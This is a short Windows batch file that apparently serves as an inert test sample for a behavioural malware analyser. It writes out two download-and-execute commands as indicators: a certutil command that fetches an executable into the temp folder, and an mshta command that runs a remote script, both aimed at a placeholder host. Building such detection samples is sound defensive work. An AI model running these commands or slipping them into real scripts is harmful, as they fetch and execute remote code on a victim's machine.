@echo off
rem DEMO - inert sample for the behavioural analyser (never executed).
rem The hostnames below do not exist; nothing is ever run.

rem Indicator: certutil URL download (LOLBin)
certutil -urlcache -f -split http://malware-sample.example.com/d.exe %TEMP%\d.exe

rem Indicator: mshta remote script (LOLBin)
mshta http://malware-sample.example.com/x.hta
